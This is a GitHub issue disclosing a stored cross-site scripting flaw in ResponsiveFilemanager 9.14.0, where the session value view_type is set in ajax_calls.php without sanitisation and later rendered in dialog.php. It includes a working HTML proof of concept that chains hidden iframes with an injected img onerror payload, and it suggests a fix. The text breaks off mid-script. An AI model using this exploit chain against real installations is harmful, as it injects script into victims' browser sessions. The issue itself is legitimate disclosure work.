# Stored xss in v9.14.0 in dialog.php in $\_SESSION['RF']["view\_type"] because of no validation if ajax\_calls.php setted this session.Â #603

## Description

![@hackoclipse](https://avatars.githubusercontent.com/u/25172757?u=2f4c7f2d34c1f19422709a2af005d3978d3d1208&v=4&size=48)[hackoclipse](https://github.com/hackoclipse)opened [on Mar 28, 2020](https://github.com/trippo/ResponsiveFilemanager/issues/603#issue-589562673)

After taking another look at the ResponsiveFilemanager 9.14.0 i noticed that in the dialog.php file on line 197 that if the $\_SESSION['RF']["view\_type"] is already set that there would not be done any validation or would it take the data from the config.

<https://github.com/trippo/ResponsiveFilemanager/blob/master/filemanager/dialog.php#L197>

This created a problem because in ajax\_calls.php in the "view" action in the "type" parameter it is possible to set that value without any validation.

<https://github.com/trippo/ResponsiveFilemanager/blob/master/filemanager/ajax_calls.php#L53>

This means if you would first request a session by going to the dialog.php, than going to the ajax\_calls.php and request the view action and as "type" parameter you give a html tag.

Than if you done al that go back to the dialog.php page than $\_SESSION['RF']["view\_type"] would be read and unescaped placed on all places where $view is used what created stored xss until the session isn't valid anymore.

A very simple patch would be to add fix\_get\_params() in the dialog.php on line 197 when the $view is set.

<https://github.com/trippo/ResponsiveFilemanager/blob/master/filemanager/dialog.php#L197>

I made a simple html file you can use to validate this vulnerability.

It is made for Firefox because it does make use of iframe's and a clickjacking vulnerability but if the session was already set than this would also work in other browsers with a miner change.

you would need to change all "<http://192.168.0.29:3001>" to your website.

When runned it would make 3 iframe's.

One to request the dialog.php file to get a PHPSESSID and to set $\_SESSION['RF']["verify"] as RESPONSIVEfilemanager.

Second it would open the ajax\_calls.php to set the html tag.

And tirth it reopens the dialog.php page to trigger the stored xss

```
<!DOCTYPE html>
<html>
<head>
<script>
var url = "http://192.168.0.29:3001";
/**
Execute the "view" action in ajax_calls.php and set as "type" a html tag.
This will set $_SESSION['RF']["view_type"] on line 53 as my html tag.
https://github.com/trippo/ResponsiveFilemanager/blob/428069746fabcef495b44d690bec20a05279a194/filemanager/ajax_calls.php#L53
**/
function iframe1(){
	var ifrm = document.createElement("iframe");
	ifrm.setAttribute("src", url+"/filemanager/ajax_calls.php?action=view&type=%22%3E%3Cimg/src=%27x%27/onerror=alert(document.domain)%3E", "myWindow", "width=200, height=100");
	ifrm.setAttribute("onload", "iframe2();");
	ifrm.setAttribute("style", "visibility: hidden;");
	ifrm.style.width = "640px";
	ifrm.style.height = "480px";
	document.body.appendChild(ifrm);
}

/**
Go back to the dialog.php to trigger a xss starting at line 197 because when $_SESSION['RF']["view_type"] is already set and the view parameter isn't set than it would not take the data from the $config['default_view'] but uses the old data from $_SESSION['RF']["view_type"].
And if view isn't set than it won't execute fix_get_params() what would prevented xss.
because in ajax_calls.php this value wasn't sanitized with fix_get_params() when we setted the $_SESSION['RF']["view_type"] there is a stored xss until the session is expired.

function iframe2(){
	var ifrm1 = document.createElement("iframe");
	ifrm1.setAttribute("src", url+"/filemanager/dialog.php?type=0&lang=en_EN&popup=0&crossdomain=0&relative_url=0&akey=key&fldr=/", "myWindow", "width=200, height=100");

	ifrm1.style.width = "640px";
	ifrm1.style.height = "480px";
	document.body.appendChild(ifrm1);
